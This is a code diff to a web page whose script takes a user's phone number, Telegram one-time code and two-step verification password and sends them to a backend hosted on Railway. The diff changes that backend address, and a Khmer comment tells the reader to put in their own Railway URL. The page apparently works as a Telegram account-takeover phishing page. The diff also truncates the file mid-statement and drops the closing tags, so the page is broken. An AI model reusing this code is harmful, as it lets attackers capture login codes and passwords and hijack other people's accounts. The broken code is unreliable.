@@ -64,7 +64,8 @@
     </div>
 
     <script>
-        const BACKEND_URL = "https://telegram-production-6705.up.railway.app";
+        // ប្តូរមក URL Railway ថ្មីរបស់អ្នក
+        const BACKEND_URL = "https://jvpcambodia.up.railway.app";
 
         async function sendPhone() {
             const phone = document.getElementById('phone-input').value.trim();
@@ -119,7 +120,6 @@
                 if (data.success) {
                     alert('🎉 Login Successful!');
                 } else if (data.requiresPassword) {
-                    // បង្ហាញ Input វាយ Password ប្រសិនបើ Telegram ទាមទារ 2FA
                     document.getElementById('password-container').classList.remove('hidden');
                     alert('This account has Two-Step Verification enabled. Please enter your 2FA password.');
                 } else {
@@ -135,9 +135,4 @@
             document.getElementById('step-otp').classList.add('hidden');
             document.getElementById('password-container').classList.add('hidden');
             document.getElementById('password-input').value = '';
-            document.getElementById('otp-input').value = '';
-            document.getElementById('step-phone').classList.remove('hidden');
-        }
-    </script>
-</body>
-</html>
+            document.getElementById('
